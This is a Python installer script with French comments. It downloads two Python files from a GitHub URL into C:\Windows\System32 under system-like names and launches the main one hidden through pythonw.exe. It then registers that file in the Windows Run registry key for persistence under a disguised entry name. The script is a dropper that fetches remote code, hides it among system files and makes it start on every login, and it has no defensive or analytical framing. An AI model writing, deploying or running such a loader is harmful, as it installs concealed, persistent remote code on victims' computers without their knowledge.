import os
import winreg
import requests
import subprocess
import time

# Chemin d'installation
SYSTEM32 = r"C:\Windows\System32"
# Nom utilisé dans le registre pour l'entrée de démarrage
RUN_KEY_NAME = "SystemRuntime32AutoRun"

# URLs des fichiers à télécharger
URLS = {
    "wmihelper.py": "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/wmihelper.py",
    "SystemRuntime32.py": "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/SystemRuntime32.py",
}


def download_and_save(filename, url):
    """Télécharge un fichier depuis une URL et le sauvegarde dans SYSTEM32."""
    print(f"[i] Téléchargement de {filename} depuis {url} ...")
    try:
        response = requests.get(url, timeout=15)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Erreur téléchargement {filename}: {e}")
        return None

    target_path = os.path.join(SYSTEM32, filename)
    try:
        with open(target_path, "w", encoding="utf-8") as f:
            f.write(response.text)
    except Exception as e:
        print(f"[!] Erreur écriture fichier {target_path}: {e}")
        return None

    if not os.path.isfile(target_path) or os.path.getsize(target_path) == 0:
        print(f"[!] Fichier {target_path} absent ou vide après écriture.")
        return None

    print(f"[✓] {filename} sauvegardé dans {target_path}")
    return target_path


def download_all_scripts():
    """Télécharge tous les fichiers définis dans URLS."""
    saved_paths = {}
    for filename, url in URLS.items():
        path = download_and_save(filename, url)
        if not path:
            print("[!] Échec lors du téléchargement de tous les fichiers.")
            return None
        saved_paths[filename] = path
        time.sleep(1)
    return saved_paths


def run_script(path):
    """Lance un script Python en arrière-plan via pythonw.exe."""
    print(f"[i] Lancement du script : {path}")
    try:
        subprocess.Popen(['pythonw.exe', path], close_fds=True)
        print(f"[✓] Script lancé en arrière-plan.")
    except Exception as e:
        print(f"[!] Échec lancement script : {e}")


def add_to_startup(script_path):
    """Ajoute le script au démarrage de Windows via le registre."""
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{script_path}"')
        print(f"[✓] Ajout au démarrage : {script_path}")
    except Exception as e:
        print(f"[!] Échec ajout démarrage : {e}")


def main():
    if not os.access(SYSTEM32, os.W_OK):
        print("[!] Ce script doit être exécuté en tant qu'administrateur.")
        return

    print("[i] Téléchargement des fichiers...")
    paths = download_all_scripts()
    if not paths:
        return

    main_script = paths.get("SystemRuntime32.py")
    if not main_script:
        print("[!] Fichier principal introuvable.")
        return

    run_script(main_script)
    add_to_startup(main_script)

    print("[✓] Installation terminée avec succès.")


if __name__ == "__main__":
    main()
